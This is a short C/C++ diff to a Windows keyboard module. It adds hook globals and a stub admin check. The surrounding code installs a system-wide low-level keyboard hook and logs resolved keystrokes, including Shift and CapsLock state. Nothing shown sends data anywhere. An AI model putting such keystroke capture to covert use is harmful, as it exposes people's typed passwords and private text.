@@ -1,9 +1,15 @@
 #include "keyboard.h"
 
+HHOOK ghHook;
+KBDLLHOOKSTRUCT kbdStruct;
 bool gKeyboardLocked = 0; // temporary global variable to simulate keyboard being either locked or released
 
+int KeyboardMod::requireAdmin() {
+    return 0;
+}
+
 void KeyboardMod::start() {
-    
+
     // set the keyboard hook for all processes on the computer
     // runs the hookCallback function when hooked is triggered
     if(!(ghHook = SetWindowsHookExW(WH_KEYBOARD_LL, hookCallback, NULL, 0))) {
@@ -11,10 +17,10 @@ void KeyboardMod::start() {
     }
 
     wprintf(L"Hook successfully installed!\n");
-    
+
     MSG msg;
     while(GetMessage(&msg, NULL, 0, 0)) {
-        
+
     }
 
 }
@@ -29,13 +35,13 @@ void logKeystroke(int vkCode) {
     // KBDLLHOOKSTRUCT stores the keyboard inputs as Virtual-Key codes
     // resolution and logging of the keystrokes is performed here
     // also ignores mouse inputs
-    
+
     HKL kbLayout = GetKeyboardLayout(GetCurrentProcessId());
 
-    
+
     // check for CapsLock
     bool lowercase = !(GetKeyState(VK_CAPITAL) & 0x0001);
-    
+
     // check for Shift keys
     if((GetKeyState(VK_SHIFT) & 0x1000) || (GetKeyState(VK_LSHIFT) & 0x1000) || (GetKeyState(VK_RSHIFT) & 0x1000)) {
         lowercase = !lowercase;
